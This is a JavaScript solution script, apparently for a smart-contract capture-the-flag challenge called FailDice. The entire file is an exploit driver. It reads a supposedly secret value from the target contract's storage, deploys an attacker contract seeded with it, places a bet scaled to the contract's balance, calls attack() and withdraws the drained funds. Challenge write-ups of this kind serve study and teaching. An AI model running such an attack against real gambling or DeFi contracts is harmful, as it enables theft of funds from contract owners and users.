const fs = require("fs");

const Solution = require("../Solution");
const compile = require("../../utils/compile");
const { FAILDICE_ADDR } = require("../../config/addresses");

class FailDiceSolution extends Solution {
    constructor() {
        super(FAILDICE_ADDR);
    }

    compileExploit() {
        console.log("Compiling exploit contract");
        return compile("exploit.sol", fs.readFileSync("./solutions/faildice/exploit.sol", "utf-8"));
    }

    async run() {
        await this.unlock();
        console.log("Running faildice solution...");
        await this.printBalances();
        try {
            console.log("Getting big secret");
            const bigSecret = await this.w3.eth.getStorageAt(this.challengeAddr, 0);
            console.log("Got big secret");

            const { Exploit: exploitContract } = await this.compileExploit();
            console.log("Compiled exploit contract");

            console.log("Deploying exploit...");
            const { abi, evm: { bytecode: { object: bytecode } } } = exploitContract;
            const exploit = new this.w3.eth.Contract(abi);

            const deployedExploit = await exploit.deploy({
                data: bytecode,
                arguments: [this.w3.utils.toBN(bigSecret), this.challengeAddr],
            }).send({
                from: this.myAddr,
            });

            console.log("Deployed exploit");
            const cBalance = await this.w3.eth.getBalance(this.challengeAddr);
            const bet = Math.ceil(cBalance / 9);
            const gas = await deployedExploit.methods.attack().estimateGas({ from: this.myAddr, value: bet });

            console.log("Starting attack");
            await deployedExploit.methods.attack().send({
                from: this.myAddr,
                gas,
                value: bet,
            });

            console.log("Attacked, withdrawing funds");

            await deployedExploit.methods.withdraw().send({
                from: this.myAddr,
            });

            console.log("Done!");
        } catch (err) {
            console.error(err);
        }

        await this.printBalances();
    }
}

module.exports = FailDiceSolution;
